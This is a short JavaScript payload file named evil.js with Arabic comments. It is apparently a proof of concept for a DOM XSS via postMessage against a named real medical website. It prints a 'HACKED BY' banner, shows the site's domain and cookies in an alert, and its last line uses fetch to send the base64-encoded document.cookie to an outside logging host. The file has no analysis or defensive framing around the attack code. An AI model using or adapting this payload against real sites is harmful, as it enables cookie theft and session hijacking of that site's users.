// evil.js
// سيتم تنفيذ هذا الكود داخل سياق doctor.webmd.com
console.log("!!! HACKED BY EGYHAKER !!!");

// إظهار تنبيه يثبت الاختراق (DOM XSS)
alert(
    "Vulnerability: DOM XSS via PostMessage\n" +
    "Domain: " + document.domain + "\n" +
    "Cookies: " + (document.cookie || "No HttpOnly cookies accessible")
);

// مثال لسرقة بيانات (اختياري)
fetch('https://egyhaker.github.io/log?data=' + btoa(document.cookie));
